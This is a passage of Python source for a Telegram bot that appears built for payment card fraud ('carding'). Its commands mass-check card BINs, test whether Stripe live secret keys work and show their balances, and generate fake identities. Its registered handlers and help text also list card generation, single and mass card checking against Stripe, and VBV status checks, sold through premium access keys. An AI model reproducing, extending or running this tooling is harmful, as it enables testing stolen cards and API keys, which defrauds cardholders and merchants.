    async def stop_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        query = update.callback_query
        await query.answer()

        session_id = int(query.data.split('_')[-1])
        if session_id in MASS_CHECK_ACTIVE:
            MASS_CHECK_ACTIVE[session_id] = False
            await query.edit_message_text("🛑 Mass check stopped by user.")

    @staticmethod
    async def split_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Split a file into multiple parts based on line count"""
        if not await check_user_access(update, context):
            return

        if not update.message.reply_to_message:
            await update.message.reply_text("Please reply to a file or message containing the data to split")
            return

        try:
            # Get number of lines per split
            if not context.args:
                await update.message.reply_text("Please specify number of lines per split.\nUsage: /split <lines_per_split>")
                return

            lines_per_split = int(context.args[0])
            if lines_per_split <= 0:
                await update.message.reply_text("Number of lines must be positive")
                return

            # Get content from file or text message
            if update.message.reply_to_message.document:
                file = await update.message.reply_to_message.document.get_file()
                content = (await file.download_as_bytearray()).decode('utf-8')
            else:
                content = update.message.reply_to_message.text

            if not content:
                await update.message.reply_text("No content found to split")
                return

            # Split content into lines
            lines = [line for line in content.split('\n') if line.strip()]
            total_lines = len(lines)

            if total_lines == 0:
                await update.message.reply_text("No valid lines found to split")
                return

            # Calculate number of parts
            num_parts = (total_lines + lines_per_split - 1) // lines_per_split

            status_msg = await update.message.reply_text(f"Splitting {total_lines} lines into {num_parts} parts...")

            # Create and send split files
            for i in range(num_parts):
                start_idx = i * lines_per_split
                end_idx = min(start_idx + lines_per_split, total_lines)
                part_content = '\n'.join(lines[start_idx:end_idx])

                with open(f'part_{i+1}.txt', 'w', encoding='utf-8') as f:
                    f.write(part_content)

                with open(f'part_{i+1}.txt', 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=f'Part{i+1}.txt',
                        caption=f"Part {i+1}/{num_parts} ({end_idx-start_idx} lines)"
                    )
                os.remove(f'part_{i+1}.txt')

            await status_msg.edit_text(f"✅ Split complete! Generated {num_parts} files.")

        except ValueError:
            await update.message.reply_text("Please provide a valid number for lines per split")
        except Exception as e:
            logger.error(f"Error in split command: {str(e)}")
            await update.message.reply_text(f"Error processing your request: {str(e)}")

    @staticmethod
    async def mbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle mass BIN checking command"""
        if not await check_user_access(update, context):
            return

        message_text = update.message.text.strip()
        bins = [line.strip() for line in message_text.split('\n')[1:] if line.strip()]

        if not bins:
            await update.message.reply_text("Please provide BINs to check (one per line)")
            return

        status_msg = await update.message.reply_text("🔄 Processing BINs...")
        results = []

        for bin_num in bins:
            if len(bin_num) < 6:
                results.append(f"⚠️ Invalid BIN format for {bin_num}")
                continue

            first_six = bin_num[:6]
            try:
                bin_info = await get_bin_info(first_six)
                is_valid = bin_info.get('brand') != 'Unknown' and bin_info.get('brand') is not None

                result_text = f"""▐ {'𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡 ✅️' if is_valid else 'Invalid BIN ⚠️'} ▐

𝗕𝗜𝗡 ⇾ {first_six}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'Unknown')}
𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: USD
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'Unknown')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country_name', 'Unknown')} ({bin_info.get('country_code', 'N/A')})
"""
                results.append(result_text)
            except Exception as e:
                results.append(
                    f"▐  Invalid BIN ⚠️ ▐\n\n"
                    f"𝗕𝗜𝗡 ⇾ {first_six}\n\n"
                    f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: Unknown\n"
                    f"𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: USD\n"
                    f"𝗕𝗮𝗻𝗸: Unknown\n"
                    f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: Unknown (N/A)"
                )

        final_text = "\n\n".join(results) + f"\n𝗥𝗲𝗾 ⌁ @{update.effective_user.username}"

        if len(final_text) > 4096:
            # If response is too long, send as file
            with open('bin_results.txt', 'w', encoding='utf-8') as f:
                f.write(final_text)
            with open('bin_results.txt', 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename='bin_results.txt',
                    caption=f"BIN check results\n𝗥𝗲𝗾 ⌁ @{update.effective_user.username}"
                )
            os.remove('bin_results.txt')
        else:
            await status_msg.edit_text(final_text)

    @staticmethod
    async def check_sk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Check if a Stripe secret key is valid"""
        if not await check_user_access(update, context):
            return

        if not context.args:
            await update.message.reply_text("Please provide a Stripe key to check.\nUsage: /sk <stripe_key>")
            return

        sk = context.args[0]

        # Validate SK format
        if not sk.startswith('sk_live_'):
            await update.message.reply_text("❌ Invalid key format. Key must start with sk_live_")
            return

        headers = {
            'Authorization': f'Bearer {sk}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Stripe-Version': '2020-08-27',
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.stripe.com/v1/balance', headers=headers) as response:
                    if response.status == 200:
                        balance_data = await response.json()
                        available = balance_data['available'][0]['amount'] if balance_data['available'] else 0
                        pending = balance_data['pending'][0]['amount'] if balance_data['pending'] else 0

                        await update.message.reply_text(
                            f"✅ Valid Stripe Key!\n\n"
                            f"💰 Available Balance: ${available/100:.2f}\n"
                            f"⏳ Pending Balance: ${pending/100:.2f}\n\n"
                            f"Key: {sk[:28]}...{sk[-4:]}"
                        )
                    else:
                        error_data = await response.json()
                        await update.message.reply_text(
                            f"❌ Invalid Key!\n"
                            f"Error: {error_data.get('error', {}).get('message', 'Unknown error')}"
                        )
        except Exception as e:
            await update.message.reply_text(f"❌ Error checking key: {str(e)}")

    @staticmethod
    async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Get information about the chat"""
        user = update.effective_user
        is_premium = is_premium_user(user.id)
        expiry_date = None

        if is_premium:
            with open(PREMIUM_USERS_FILE, 'r') as f:
                for line in f.readlines():
                    parts = line.strip().split('|')
                    if len(parts) == 2 and int(parts[0]) == user.id:
                        expiry_date = datetime.fromisoformat(parts[1])
                        break

        join_date = None
        try:
            with open(REGISTERED_USERS_FILE, 'r') as f:
                for line in f.readlines():
                    if str(user.id) in line:
                        join_date = line.strip().split('|')[1]
                        break
        except:
            join_date = "Unknown"

        response = f"""———————

ID: `{user.id}`
Username: `@{user.username or 'None'}`
Plan: {'Premium 👑' if is_premium else 'Free User 👤'}

[※]》 Joined At: {join_date or 'Unknown'}
[※]》Referrals: 0
[※]》 Expires At: {expiry_date.strftime('%Y-%m-%d') if expiry_date else 'N/A'}"""
        await update.message.reply_text(response, parse_mode='Markdown')

    @staticmethod
    async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Get user ID"""
        user = update.effective_user
        await update.message.reply_text(f"Your ID: `{user.id}`", parse_mode='Markdown')

    @staticmethod
    async def me_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Get user information"""
        user = update.effective_user
        is_premium = is_premium_user(user.id)
        expiry_date = None

        if is_premium:
            with open(PREMIUM_USERS_FILE, 'r') as f:
                for line in f.readlines():
                    parts = line.strip().split('|')
                    if len(parts) == 2 and int(parts[0]) == user.id:
                        expiry_date = datetime.fromisoformat(parts[1])
                        break

        join_date = None
        try:
            with open(REGISTERED_USERS_FILE, 'r') as f:
                for line in f.readlines():
                    if str(user.id) in line:
                        join_date = line.strip().split('|')[1]
                        break
        except:
            join_date = "Unknown"

        response = f"""———————

ID: `{user.id}`
Username: `@{user.username or 'None'}`
Plan: {'Premium 👑' if is_premium else 'Free User 👤'}

[※]》 Joined At: {join_date or 'Unknown'}
[※]》Referrals: 0
[※]》 Expires At: {expiry_date.strftime('%Y-%m-%d') if expiry_date else 'N/A'}"""
        await update.message.reply_text(response, parse_mode='Markdown')

    @staticmethod
    async def generate_random_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Generate random user information"""
        if not await check_user_access(update, context):
            return

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RANDOM_USER_API) as response:
                    data = await response.json()
                    user = data['results'][0]
                    
                    response_text = f"""👤 Random User Information:
━━━━━━━━━━━━━━━
📛 Name: {user['name']['first']} {user['name']['last']}
📧 Email: {user['email']}
📱 Phone: {user['phone']}
🌍 Country: {user['location']['country']}
🏠 Address: {user['location']['street']['number']} {user['location']['street']['name']}
🌆 City: {user['location']['city']}
📮 Postcode: {user['location']['postcode']}
━━━━━━━━━━━━━━━"""
                    await update.message.reply_text(response_text)
        except Exception as e:
            await update.message.reply_text(f"Error generating random user: {str(e)}")

    @staticmethod
    async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()

        if query.data.startswith('stop_check_'):
            session_id = int(query.data.split('_')[-1])
            if session_id in MASS_CHECK_ACTIVE:
                MASS_CHECK_ACTIVE[session_id] = False
                await query.edit_message_text("🛑 Mass check stopped by user.")
                return

        if query.data == 'cmds':
            await Commands.cmds(update, context)
        elif query.data == 'random_user':
            await Commands.generate_random_user(update, context)
        elif query.data == 'stripe':
            help_text = """Available Stripe Commands:
/st - Check single card
/mst - Mass check cards
/sk - Check Stripe key
/stt - Auth check
/mstt - Mass auth check"""
            await query.message.reply_text(help_text)
        elif query.data == 'other':
            help_text = """Other Commands:
/gen - Generate cards
/gbin - Generate BINs
/bin - Check BIN
/mbin - Mass check BINs
/vbv - Check VBV status"""
            await query.message.reply_text(help_text)

    @staticmethod
    async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        if not await check_user_access(update, context):
            return

        if not context.args:
            await update.message.reply_text("Please provide a BIN number to check.\nUsage: /bin <bin_number>")
            return

        bin_number = context.args[0].split('|')[0][:6]  # Take first 6 digits if card number provided
        if not bin_number.isdigit() or len(bin_number) < 6:
            await update.message.reply_text("Please provide a valid BIN number (at least 6 digits)")
            return

        try:
            bin_info = await get_bin_info(bin_number)

            response = f"""▐ 𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡 ✅️ ▐

𝗕𝗜𝗡 ⇾ {bin_number}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'N/A')}
𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆: {bin_info.get('currency', 'USD')}
𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'N/A')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country_name', 'N/A')} ({bin_info.get('country_code', 'N/A')})
𝗥𝗲𝗾 ⌁ @{update.effective_user.username}"""

            await update.message.reply_text(response)

        except Exception as e:
            logger.error(f"Error checking BIN: {str(e)}")
            await update.message.reply_text("Error checking BIN. Please try again later.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle errors caused by updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)
    if isinstance(context.error, Forbidden):
        logger.warning("Bot was blocked by the user")
    elif isinstance(context.error, NetworkError):
        logger.warning("Network error occurred")
    else:
        logger.error("Update %s caused error %s", update, context.error)

def run_bot():
    # Initialize bot with optimized settings for concurrent requests
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .pool_timeout(60)
        .read_timeout(60)
        .write_timeout(60)
        .connection_pool_size(100)
        .concurrent_updates(True)
        .build()
    )

    # Register error handler
    application.add_error_handler(error_handler)

    # Add conversation handler for /gbin command
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('gbin', Commands.gbin_command)],
        states={
            SELECT_BIN_TYPE: [MessageHandler(filters.TEXT & ~filters.COMMAND, Commands.select_bin_type)],
            SELECT_DIGITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, Commands.select_digits)],
        },
        fallbacks=[CommandHandler('cancel', Commands.cancel_command)],
    )

    # Add command handlers
    application.add_handler(CommandHandler("start", Commands.start))
    application.add_handler(CommandHandler("register", Commands.register_command))
    application.add_handler(CommandHandler("cmds", Commands.cmds))
    application.add_handler(CommandHandler("user", Commands.generate_random_user))
    application.add_handler(CommandHandler("st", Commands.st_command))
    application.add_handler(CommandHandler("gen", Commands.gen_command))
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("mst", Commands.mst_command))
    application.add_handler(CommandHandler("mstt", Commands.mstt_command))
    application.add_handler(CommandHandler("sk", Commands.check_sk))
    application.add_handler(CommandHandler("svv", Commands.svv_command))
    application.add_handler(CommandHandler("stt", Commands.stt_command))
    application.add_handler(CommandHandler("stop", Commands.stop_command))
    application.add_handler(CommandHandler("vbv", Commands.vbv_command))
    application.add_handler(CommandHandler("bin", Commands.bin_command))
    application.add_handler(CommandHandler("mbin", Commands.mbin_command))
    application.add_handler(CommandHandler("key", Commands.key_command))
    application.add_handler(CommandHandler("redeem", Commands.redeem_command))
    application.add_handler(CommandHandler("degrade", Commands.degrade_command))
    application.add_handler(CommandHandler("premium", Commands.premium_info_command))
    application.add_handler(CommandHandler("info", Commands.info_command))
    application.add_handler(CommandHandler("id", Commands.id_command))
    application.add_handler(CommandHandler("me", Commands.me_command))
    application.add_handler(CommandHandler("split", Commands.split_command))
    application.add_handler(CallbackQueryHandler(Commands.button_callback))
    application.add_handler(CallbackQueryHandler(Commands.stop_check_callback, pattern=r"^stop_check_\d+$"))

    # Add message handler for SK input
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^sk_') & ~filters.COMMAND, Commands.handle_sk_message))

    # Start bot with increased connection pool
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        pool_timeout=60,
        read_timeout=60,
        write_timeout=60,
        connect_timeout=60
    )

if __name__ == "__main__":
    # Create necessary files if they don't exist
    for file in [REGISTERED_USERS_FILE, PREMIUM_USERS_FILE, PREMIUM_KEYS_FILE]:
        if not os.path.exists(file):
            open(file, 'w').close()

    # Start Telegram bot
    run_bot()